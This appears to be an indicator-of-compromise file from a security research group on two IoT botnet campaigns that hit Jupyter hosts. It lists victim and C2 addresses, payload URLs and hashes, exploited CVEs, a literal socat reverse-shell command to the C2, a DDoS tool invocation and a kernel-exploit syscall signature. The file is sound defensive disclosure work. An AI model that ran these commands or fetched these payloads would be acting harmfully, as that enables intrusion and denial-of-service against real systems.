@@ -1,0 +1,118 @@
+# Hilix-classic + Uirusu/2.0 Jupyter-targeting IoT botnet campaigns — IOC bundle
+# 2026-05-06 / 2026-05-07
+# NuClide Research
+
+# ============================================================
+# CONFIRMED VICTIM HOSTS
+# ============================================================
+
+134.60.110.66                                                    # Universität Ulm Med Faculty
+labdevice.medizin.uni-ulm.de                                     # rDNS (Cortical Labs CL1, sys_id CL1-2544-043, software v0.28.3)
+
+101.34.81.166                                                    # Tencent Cloud Beijing customer
+                                                                 # (Chinese AI-agent dev "lightclawbot", OpenClaw framework — benign operator)
+
+# ============================================================
+# CAMPAIGN A — Hilix-classic
+# ============================================================
+
+# Active C2 (reverse-shell receiver, port 80 nginx-default decoy + port 3053 receiver)
+172.233.96.208                                                   # Akamai/Linode US
+172-233-96-208.ip.linodeusercontent.com                          # rDNS
+
+# Malware distribution
+38.87.117.84                                                     # Cogent / DATALIX-CGNT-NET-2
+velonodes.in                                                     # rDNS
+
+# Payload SHA256 (sample NOT included in repo — see README; hash for VT/MB lookup)
+ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72  Hilix.x86_64
+
+# Hilix-classic User-Agent rotation pool
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0"
+
+# Hilix-classic payload paths
+http://38.87.117.84/bins/Hilix.<arch>                            # multi-arch (x86_64, mips, arm, etc.)
+
+# Hilix-classic campaign argv (botnet identifies victim class to C2)
+huawei                                                           # UPnP/HG532 router victims
+realtek                                                          # Realtek SDK router victims
+jupiter                                                          # Jupyter Notebook victims
+
+# Reverse-shell command pattern (used after architecture-mismatch failure)
+socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053
+
+# ============================================================
+# CAMPAIGN B — Uirusu/2.0 (separate Mirai-derivative actor)
+# ============================================================
+
+# C2 / payload distribution
+173.232.146.173                                                  # Eonix Corporation US
+zknotes.com                                                      # rDNS — likely compromised legitimate customer
+
+# Payload SHA256
+38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0  vcimanagement.x64
+
+# Uirusu/2.0 User-Agent (literal, no rotation)
+"Uirusu/2.0"                                                     # Japanese ウイルス = "virus", botnet author signature
+"python-requests/2.20.0"                                         # for some exploit modules
+
+# Uirusu/2.0 payload paths
+http://173.232.146.173/bins/x86
+http://173.232.146.173/mips
+http://173.232.146.173/8UsA.sh                                   # shell installer
+
+# Uirusu/2.0 campaign argv
+mips                                                             # MIPS router victims
+ThinkPHP                                                         # ThinkPHP CVE-2018-20062 victims
+
+# Uirusu/2.0 exploit bundle (broader than Hilix-classic)
+UPnP/HG532 (CVE-2017-17215)                                      # Huawei HG532 home gateway
+ThinkPHP (CVE-2018-20062)                                        # PHP framework RCE
+MVPower DVR RCE                                                  # /cgi-bin/ViewLog.asp injection
+Huawei admin Digest hardcoded ("dslf-config:HuaweiHomeGateway")
+
+# ============================================================
+# COMMON / SHARED INDICATORS
+# ============================================================
+
+# Notebook-root attacker filenames (search ~labuser/ or ~<user>/ on every device)
+TPC3.ipynb                                                       # reverse-shell injection notebook (Ulm)
+Untitled.ipynb / Untitled1-6.ipynb                               # attacker working notebooks (both victims)
+_recon.py / _recon.ipynb                                         # reconnaissance script
+x86_64                                                           # Hilix-classic payload (architecture-mismatch on ARM hosts)
+2.js                                                             # Layer-7 HTTP/2 (HPACK) DDoS tool — Node.js
+proxy.txt                                                        # proxy list for DDoS tool source rotation
+untitled.txt                                                     # attacker scratch/marker file
+vcimanagement.x64                                                # Uirusu/2.0 payload
+
+# Process masquerade pattern (post-compromise persistence)
+[kworker/N:M] owned by non-root user (e.g. labuser)              # suspected XMRig miner
+
+# AF_ALG kernel exploit signature (Tencent host post-foothold privilege escalation)
+socket(AF_ALG=38, SOCK_SEQPACKET=5, 0)                           # then bind("aead", "authencesn(hmac(sha256),cbc(aes))")
+setsockopt(SOL_ALG=279, ALG_SET_KEY=1, ...)                      # +ALG_SET_OP=3, ALG_SET_IV=2, ALG_SET_AEAD_ASSOCLEN=4
+sendmsg([...], [...3 cmsg with SOL_ALG], 32768)                  # buffer overflow trigger
+g.splice(...)                                                    # data movement primitive
+
+# DDoS-for-hire target observed in Untitled1.ipynb cell #1 (Tencent host)
+node 2.js GET https://a.intincity.promo 10000 10 32 proxy.txt    # 10K reqs × 32 threads × proxy-rotation
+
+# Attempted persistence (Untitled1.ipynb cell #20 — Python /etc/shadow modify)
+# Read /etc/shadow, parse root line, rewrite — would set persistent root password
+# (requires root from AF_ALG exploit to actually write)
+
+# ============================================================
+# DISCLOSURE CHANNELS USED
+# ============================================================
+
+cert@uni-ulm.de + dfn-cert@dfn-cert.de                            # Ulm victim CERT
+abuse@tencent.com                                                 # Tencent victim
+abuse@akamai.com + abuse@linode.com                               # Hilix-classic C2 takedown
+abuse@cogentco.com                                                # Hilix-classic malware-distro
+net-abuse@eonix.net                                               # Uirusu/2.0 C2 takedown
+support@corticallabs.com                                          # CL1 vendor advisory + fleet audit
